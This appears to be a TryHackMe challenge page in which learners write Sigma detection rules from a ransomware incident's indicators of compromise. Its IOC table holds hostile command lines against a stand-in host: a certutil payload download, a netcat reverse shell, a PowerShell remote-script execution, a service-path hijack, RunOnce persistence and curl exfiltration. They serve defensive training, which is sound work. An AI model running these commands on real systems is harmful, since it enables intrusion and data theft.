{'image': 'https://tryhackme-images.s3.amazonaws.com/room-icons/d4a19b63d083873e115f15b642c52981.png', 'title': 'SigHunt', 'description': 'You are tasked to create detection rules based on a new threat intel.', 'code': 'sighunt', 'users': 2058, 'tags': ['security', 'sigma', 'detection'], 'type': 'challenge', 'difficulty': 'medium', 'userCompleted': False, 'upVotes': 101, 'created': '2022-08-18T16:33:48.725Z', 'published': '2023-01-13T19:00:00.259Z', 'freeToUse': True, 'businessOnly': False, 'headerImage': 'https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/afe9ab51b908e5af168f28035d81a540.png', 'creator': 'ar33zy', 'tasks': [{'taskTitle': 'Introduction', 'taskDesc': '<p>This room aims to be a supplementary room for Sigma rule creation. In this scenario, you will act as one of the Detection Engineers that will craft Sigma Rules based on the Indicators of Compromise (IOCs) collected by your Incident Responders.</p><p><span style="font-size:24px">\ufeffPrerequisites</span></p><p>\ufeffThis room requires basic knowledge of detection engineering and Sigma rule creation. We recommend going\xa0through the following rooms before attempting this challenge.</p><ul><li><a href="https://tryhackme.com/room/introtodetectionengineering" target="_blank">Intro to Detection Engineering</a></li><li><a href="https://tryhackme.com/room/sigma" target="_blank">Sigma</a></li></ul><p><span style="font-size:24px">SigHunt Interface</span></p><p>Before we proceed, deploy the attached machine in this task since it may take up to 3-5 minutes to initialize the services.</p><p>Then, use this link to access the interface - <a href="http://MACHINE_IP" target="_blank">http://MACHINE_IP</a></p><p><b>How to use the SigHunt Interface:</b></p><ul><li><b>Run</b> - Submit your Sigma rule and see if it detects the malicious IOC.</li><li><b>Text Editor </b>-<b>\xa0</b>Write your Sigma rule in this section.</li><li><b>Create Rule</b> - Create a Sigma rule for the malicious IOC.</li><li><b>View Log</b> - View the log details associated with the malicious IOC.</li></ul><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/4dbbf6e373e444b39500af6c68d98fbb.png" alt="Sighunt Interface." style="width:100%" /></p>', 'taskType': 'vm', 'taskNo': 1, 'taskCreated': '2022-09-01T16:57:42.818Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '6373a8a25e97000050f115f0', 'questions': [{'questionNo': 1, 'question': "Let's start creating Sigma rules!", 'hint': ''}]}, {'taskTitle': 'Huntme Incident', 'taskDesc': '<p><span style="font-size:24px">Scenario</span></p><p>You are hired as a Detection Engineer for your organization. During your first week, a ransomware incident has just concluded, and the Incident Responders of your organization have successfully mitigated the threat. With their collective effort, the Incident Response (IR)\xa0Team provided the IOCs based on their investigation. Your task is to create Sigma rules to improve the detection capabilities of your organization and prevent future incidents similar to this.</p><p><span style="font-size:24px">Indicators of Compromise</span></p><p><span style="font-size:16px">Based on the given incident report, the Incident Responders discovered the following attack chain:</span></p><ul><li><span style="font-size:16px">\ufeffExecution of malicious HTA payload from a phishing link.</span></li><li><span style="font-size:16px">Execution of Certutil tool to download Netcat binary.</span></li><li><span style="font-size:16px">Netcat execution to establish a reverse shell.</span></li><li><span style="font-size:16px">Enumeration of privilege escalation vectors through PowerUp.ps1.</span></li><li>Abused service modification privileges to achieve System privileges.</li><li>Collected sensitive data by archiving via 7-zip.</li><li>Exfiltrated sensitive data through <b>cURL </b>binary.</li><li>Executed ransomware with <b>huntme</b>\xa0as the file extension.\xa0</li></ul><p>In addition, the Incident Responders provided a table of IOCs at your disposal.</p><table class="table table-bordered"><tbody><tr><td style="text-align:left">Attack Technique</td><td style="text-align:left">Indicators of Compromise</td></tr><tr><td style="text-align:left">HTA payload</td><td><p style="text-align:left">Parent Image: chrome.exe</p><p style="text-align:left">Image: mshta.exe</p><p style="text-align:left">Command Line: <span style="text-align:center;font-size:1rem">C:\\Windows\\SysWOW64\\mshta.exe C:\\Users\\victim\\Downloads\\update.hta</span></p></td></tr><tr><td style="text-align:left">Certutil Download</td><td style="text-align:left"><p>Image: certutil.exe</p><p>Command Line:\xa0<span style="font-size:1rem">certutil -urlcache -split -f http://huntmeplz.com/ransom.exe ransom.exe</span></p></td></tr><tr><td style="text-align:left">Netcat Reverse Shell</td><td style="text-align:left"><p>Image: nc.exe</p><p>Command Line:\xa0<span style="font-size:1rem">C:\\Users\\victim\\AppData\\Local\\Temp\\nc.exe huntmeplz.com 4444 -e cmd.exe</span></p><p>MD5 Hash:\xa0523613A7B9DFA398CBD5EB<span style="font-size:1rem">D2DD0F4F38</span></p></td></tr><tr><td style="text-align:left">PowerUp Enumeration</td><td style="text-align:left"><p>Image: powershell.exe</p><p>Command Line:\xa0<span style="font-size:1rem">powershell "iex(new-object net.webclient).downloadstring(\'http://huntmeplz.com/PowerUp.ps1\'); Invoke-AllChecks;"</span></p></td></tr><tr><td style="text-align:left">Service Binary Modification</td><td style="text-align:left"><p>Image: sc.exe</p><p>Command Line:\xa0<span style="font-size:1rem">sc.exe config SNMPTRAP binPath= "C:\\Users\\victim\\AppData\\Local\\Temp\\rev.exe huntmeplz.com 4443 -e cmd.exe"</span></p></td></tr><tr><td style="text-align:left">RunOnce Persistence</td><td style="text-align:left"><p>Image: reg.exe</p><p>Command Line: reg add "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v MicrosoftUpdate /t REG_SZ /d "C:\\Windows\\System32\\cmdd.exe"</p></td></tr><tr><td style="text-align:left">7-zip Collection</td><td style="text-align:left"><p>Image: 7z.exe</p><p>Command Line:\xa0<span style="font-size:1rem">7z a exfil.zip * -p</span></p></td></tr><tr><td style="text-align:left">cURL Exfiltration</td><td style="text-align:left"><p>Image: curl.exe</p><p>Command Line:\xa0<span style="font-size:1rem">curl -d @exfil.zip http://huntmeplz.com:8080/</span></p></td></tr><tr><td style="text-align:left">Ransomware File Encryption</td><td style="text-align:left"><p>Image: ransom.exe</p><p>Target Filename: *.huntme</p></td></tr></tbody></table><p><span style="font-size:24px">Rule Creation Standards</span></p><p><span style="font-size:16px">\ufeffThe Detection Engineering Team follows a standard when creating a Sigma Rule. You may refer to the guidelines below.</span></p><table class="table table-bordered" style="width:1076px"><tbody><tr><td style="text-align:left">Attack Technique</td><td style="text-align:left">Required Detection Fields</td></tr><tr><td style="text-align:left">HTA payload</td><td><ul><li style="text-align:left">EventID</li><li style="text-align:left">ParentImage</li><li style="text-align:left">Image</li></ul></td></tr><tr><td style="text-align:left">Certutil Download</td><td style="text-align:left"><ul><li style="text-align:left">EventID</li><li style="text-align:left">Image</li><li style="text-align:left">CommandLine</li></ul></td></tr><tr><td style="text-align:left">Netcat Reverse Shell</td><td style="text-align:left"><ul style="text-align:center"><li style="text-align:left">EventID</li><li style="text-align:left">Image</li><li style="text-align:left">CommandLine</li><li style="text-align:left">Hashes</li></ul></td></tr><tr><td style="text-align:left">PowerUp Enumeration</td><td style="text-align:left"><ul><li style="text-align:left">EventID</li><li style="text-align:left">Image</li><li style="text-align:left">CommandLine</li></ul></td></tr><tr><td style="text-align:left">Service Binary Modification</td><td style="text-align:left"><ul><li style="text-align:left">EventID</li><li style="text-align:left">Image</li><li style="text-align:left">CommandLine</li></ul></td></tr><tr><td style="text-align:left">RunOnce Persistence</td><td style="text-align:left"><ul><li style="text-align:left">EventID</li><li style="text-align:left">Image</li><li style="text-align:left">CommandLine</li></ul></td></tr><tr><td style="text-align:left">7-zip Collection</td><td style="text-align:left"><ul><li style="text-align:left">EventID</li><li style="text-align:left">Image</li><li style="text-align:left">CommandLine</li></ul></td></tr><tr><td style="text-align:left">cURL Exfiltration</td><td style="text-align:left"><ul><li style="text-align:left">EventID</li><li style="text-align:left">Image</li><li style="text-align:left">CommandLine</li></ul></td></tr><tr><td style="text-align:left">Ransomware File Encryption</td><td style="text-align:left"><ul><li style="text-align:left">EventID</li><li style="text-align:left"><span style="font-size:1rem">TargetFilename</span></li></ul></td></tr></tbody></table>', 'taskType': 'none', 'taskNo': 2, 'taskCreated': '2022-09-01T17:51:59.004Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What is the Challenge #1 flag?', 'hint': ''}, {'questionNo': 2, 'question': '<p>What is the Challenge #2 flag?<br /></p>', 'hint': ''}, {'questionNo': 3, 'question': '<p>What is the Challenge #3 flag?<br /></p>', 'hint': 'Try utilising the Hashes field to capture all netcat executions without relying on its filename.'}, {'questionNo': 4, 'question': '<p>What is the Challenge #4 flag?<br /></p>', 'hint': ''}, {'questionNo': 5, 'question': '<p>What is the Challenge #5 flag?<br /></p>', 'hint': 'You may consider utilising the modifiers contains and all to indicate that the rule will match all the values.'}, {'questionNo': 6, 'question': '<p>What is the Challenge #6 flag?<br /></p>', 'hint': ''}, {'questionNo': 7, 'question': '<p>What is the Challenge #7 flag?<br /></p>', 'hint': ''}, {'questionNo': 8, 'question': '<p>What is the Challenge #8 flag?<br /></p>', 'hint': ''}, {'questionNo': 9, 'question': '<p>What is the Challenge #9 flag?<br /></p>', 'hint': ''}]}]}